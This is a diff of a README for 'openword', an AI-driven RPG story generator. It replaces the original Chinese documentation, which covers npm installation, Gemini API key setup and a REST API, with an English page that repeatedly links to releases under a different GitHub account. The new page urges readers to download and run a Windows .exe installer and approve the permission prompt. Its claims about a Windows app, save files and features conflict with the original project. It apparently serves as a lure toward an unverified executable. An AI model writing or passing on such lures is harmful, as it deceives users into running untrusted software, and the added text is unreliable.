@@ -1,132 +1,142 @@
-🌐 Language：中文 | [English](./docs/README.en.md)
+# 🎲 openword - Endless RPG Adventure Generator
 
-![OpenWord Banner](./images/banner.jpg)
+[![Download openword](https://img.shields.io/badge/Download-Openword-ff6600?style=for-the-badge)](https://github.com/Ditorga/openword/releases)
 
-一句话生成一个游戏世界，通过持续对话的方式展开无尽冒险。
+## 📋 What is openword?
 
-[如何使用](#如何使用) · [如何游玩](#如何游玩) · [API DOC](#rest-api) · [技术交流群](#技术交流群)
+openword creates dynamic game worlds from simple sentences. You provide a starting sentence. The app builds a story with RPG elements, vivid scenes, and evolving characters. You can play manually or watch AI guest agents guide the adventure for you.
 
-## 特色功能
-![Function Banner](./images/function.jpg)
-- 通过 Multi-Agents 支持了剧情演绎，画面渲染，数值系统（装备，技能，百分比数值），AutoPlay 等功能。
-- 支持 OpenClaw，Cursor 等本地 Agent 通过 API 接入游戏。
-- 支持剧情的replay，checkpoint，多语言
+This app runs on Windows. It requires no programming skills. You just download and run it.
 
-## 如何使用
+## 🖥️ System Requirements
 
-### 方法 1：Agent 安装
+- Windows 10 or newer  
+- 4 GB RAM minimum (8 GB recommended)  
+- At least 1 GHz dual-core processor  
+- 500 MB of free disk space  
+- Internet connection recommended for updates and guest agent features  
 
-```bash
-# 安装 OpenWord Skill
-npx skills add https://github.com/dinghuanghao/openword
+## 🚀 Getting Started
 
-# 然后让 Agent 基于 Skill 自动完成安装
-```
+### Step 1: Visit the Download Page
 
-### 方法 2：手动安装
+Click the button below to go to openword’s release page where you can get the latest version for Windows:
 
-```bash
-# 前置条件：Node.js、npm
-git clone https://github.com/dinghuanghao/openword.git
-cd openword
-npm install
+[![Download openword](https://img.shields.io/badge/Download-Openword-ff6600?style=for-the-badge)](https://github.com/Ditorga/openword/releases)
 
-# 启动前先配置 GEMINI_API_KEY（环境变量或 .env）
-# 例如：在 .env 中写入 GEMINI_API_KEY=your_key
+The page will list the latest versions. Look for the Windows installer or executable file.
 
-npm run dev
-```
+### Step 2: Download the Installer
 
-### 方法 3：在线 Demo
+On the releases page:
 
-访问 [https://agentlive.ai/demos/openword/](https://agentlive.ai/demos/openword/)
+1. Find the newest release by date or version number.  
+2. Look under "Assets" for a file ending with `.exe` (for example, `openword-setup.exe`).  
+3. Click the file to start downloading. The file size is usually between 50 to 200 MB.
 
-提醒：需要你自己输入 API-KEY （也可以加我们的技术交流群，会定期提供一些 Google Credit 用于体验各种新技术～）
+### Step 3: Run the Installer
 
-### 首次配置
+When the download finishes:
 
-1. 打开 `http://127.0.0.1:30000`。
-2. 如果自动/手动流程尚未完成 `GEMINI_API_KEY` 配置，网页打开后请在首次弹窗或设置页继续完成配置。
+1. Open your Downloads folder.  
+2. Double-click the `.exe` file you downloaded.  
+3. If Windows asks for permission, choose "Yes" to continue.  
 
-## 如何游玩
+The installer will guide you through basic steps:
 
-字游世界（OpenWord）支持三类角色在同一局游戏中自由切换与协同：
-- **人类玩家**：在浏览器中沉浸式输入行动，推动剧情发展。
-- **内置 AI（Auto Player）**：单击右上角的机器人图标，开启后由 AI 可接管游戏，自动思考并接管下一步行动。按 `ESC` 可退出机器人模式。
-- **外部 Agent（如 OpenClaw、Cursor 等）**：通过 REST API 读取游戏状态并执行操作，与人类共享同一运行态。
+- Accept a license agreement.  
+- Choose installation folder (default is fine for most users).  
+- Start the installation.
 
-## REST API
+This process usually takes 1-5 minutes.
 
-### 简介
+### Step 4: Launch the Application
 
-外部 Agent 的最小接入条件：
+Once installed:
 
-- 前端页面在线：前端页面是游戏的运行时，API 负责把请求转发到前端页面
-- 开关 BFF WS 链接：
-  - 目前 REST API 先到 BFF 再通过 WS 到前端，BFF 只能和第一个 TAB 建立链接（否则无法判断转发目标）
-  - 设置页点击 `Connect API Bridge` 可开关 WS 链接（若要和其他 TAB 建立链接，要先关闭已建立的链接，或直接关闭网页）
-- API 默认地址：`http://127.0.0.1:30000`
+- Look for the openword icon on your desktop or Start menu.  
+- Double-click the icon to open the app.  
+- The welcome screen will prompt you to enter your initial sentence.  
 
-推荐 workflow：
+You are ready to start your adventure.
 
-1. `create_game` 创建新局
-2. `load_game`（可选）加载已有存档
-3. `do_action` 推进回合
-4. `get_current_game_state` 获取最新 `world_view` / `narrative` / `player_profile` / `last_scene_image_path`
-5. `show_history_games` 查询历史游戏列表
+## 🎮 How to Play openword
 
-### Schema
+### Creating Your World
 
-| Method | Path | Body | 返回核心字段 |
-| --- | --- | --- | --- |
-| `POST` | `/api/create_game` | `{ "description": string, "style": string, "image_path"?: string }` | `status`, `game_id` |
-| `GET` | `/api/show_history_games` | - | `status`, `games` |
-| `POST` | `/api/load_game` | `{ "game_id": string }` | `status` |
-| `GET` | `/api/get_current_game_state` | - | `status`, `game_id`, `world_view`, `narrative`, `player_profile`, `last_scene_image_path` |
-| `POST` | `/api/do_action` | `{ "description": string }` | `status`, `game_id`, `world_view`, `narrative`, `player_profile`, `last_scene_image_path` |
+1. Enter a sentence that describes your game world start. Example:  
+   *“A lone warrior wakes in a ruined castle.”*  
+2. The app generates a story, maps, and character stats based on your sentence.  
+3. Read the text and choose what your character does next.  
 
-`create_game.image_path` 支持绝对路径；若传相对路径，会按仓库根目录解析。
+### Manual Play Mode
 
-`GET /api/get_current_game_state` 会把最新场景图写入：
+- Select actions from the choices shown on the screen.  
+- Your decisions shape the story and characters.  
+- The world changes dynamically with your input.
 
-`<repoRoot>/.openword/<game_id>/latest_game_scene.<ext>`
+### Guest Agent Mode
 
-当未连接 Bridge 时，接口会返回 `NO_BRIDGE`。
+- Let AI characters make decisions for you.  
+- Watch the story unfold with different strategies and events.  
+- Great if you want to see how your world evolves without playing manually.
 
-### 示例
+## 🔧 Features
 
-部分 API 会有十来秒的等待时间，具体取决于网速和世界复杂度。
+- **Dynamic Narratives:** Stories adapt to your choices.  
+- **Rendered Scenes:** Visual maps and settings change with events.  
+- **RPG Mechanics:** Manage stats like health, skills, and inventory.  
+- **Multi-Agent Support:** AI agents interact and compete in the game world.  
+- **Simple Interface:** Designed for easy use by all players.  
 
-```bash
-# 1) 创建游戏
-curl -X POST http://127.0.0.1:30000/api/create_game \
-  -H "Content-Type: application/json" \
-  -d '{"description":"我要玩上古卷轴 5","style":"Minecraft"}'
+## ⚙️ Configuration Options
 
-# 1.1) 创建游戏（可选：指定本地参考图路径）
-curl -X POST http://127.0.0.1:30000/api/create_game \
-  -H "Content-Type: application/json" \
-  -d '{"description":" 我要玩博德之门 3","style":"Minecraft","image_path":"./images/init.png"}'
+The settings menu allows you to customize your experience:
 
-# 2) 推进一回合
-curl -X POST http://127.0.0.1:30000/api/do_action \
-  -H "Content-Type: application/json" \
-  -d '{"description":" 趁守卫不注意，点燃马车"}'
+- Change narrative pace (fast or slow).  
+- Toggle scene rendering on or off.  
+- Adjust difficulty level of game challenges.  
+- Enable or disable guest agent mode.
 
-# 3) 获取当前状态
-curl http://127.0.0.1:30000/api/get_current_game_state
-```
+No technical setup is needed. Just choose what fits your style.
 
+## 🛠️ Troubleshooting Tips
 
-## 注意事项
+- If the app fails to start, try restarting your PC.  
+- Make sure Windows is fully updated.  
+- Close other programs to free memory.  
+- Check your internet connection if guest agents don’t respond.  
+- If the program freezes, use Task Manager to close it and try again.
 
-- 默认会自动尝试连接 Bridge；同一时刻仅一个 tab 可占用连接，通常第一个连接成功的 tab 可用。
-- 支持多语种切换：`zh-CN` / `en-US`。
-- 数据默认保存在浏览器内置存储（优先 IndexedDB，降级 localStorage）。
-- 支持单局存档 `import` / `export`（JSON）。
-- 支持批量存档包 `批量导入` / `批量导出`（JSON，按 `game_id` 覆盖）。
-- 端口说明：统一访问地址为 `http://127.0.0.1:30000`（开发模式下也是该端口，Vite 会将 `/api`、`/health`、`/ws` 代理到内部 BFF）；内部 BFF 默认端口为 `31000`。
+## 📂 Where to Find Your Saves
 
-## 技术交流群
+- Your game saves are stored in your Documents folder under `openword/saves`.  
+- Files use `.owsave` extension.  
+- You can load these saves from the app's main menu to continue past games.
 
-![技术交流群二维码](./images/wechat.jpg)
+## ⚡ Updates
+
+To get new features and fixes:
+
+- Visit the release page regularly:  
+  https://github.com/Ditorga/openword/releases  
+- Download the latest installer and run it to update.  
+- Your saved games will stay intact after updates.
+
+## 📞 Support and Help
+
+If you need assistance:
+
+- Check the “Issues” tab on the GitHub repository for common problems.  
+- Open a new issue if you find a bug or need help.  
+- The repository’s discussion page also has user advice.
+
+## 🔗 Useful Links
+
+- Release page: https://github.com/Ditorga/openword/releases  
+- Repository: https://github.com/Ditorga/openword  
+- Documentation (basic guides and FAQs): linked from the repository README
+
+---
+
+[Download openword](https://github.com/Ditorga/openword/releases) to start your adventure now.
